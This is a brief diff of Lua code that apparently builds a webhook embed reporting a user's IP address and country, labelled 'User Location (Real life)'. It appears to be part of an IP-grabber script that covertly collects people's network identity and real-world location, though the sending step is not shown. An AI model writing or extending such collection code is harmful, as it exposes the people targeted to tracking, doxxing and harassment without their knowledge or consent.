@@ -401,7 +401,7 @@ else
         table.insert(
             data.embeds[1].fields,
             {
-                ["name"] = "**`(🤫) Secret`**",
+                ["name"] = "**`(🤫) User Location (Real life)`**",
                 ["value"] = "||(👣) IP Address: " ..
                     ipinfo_table.ip ..
                         "||\n||(🌆) Country: " ..
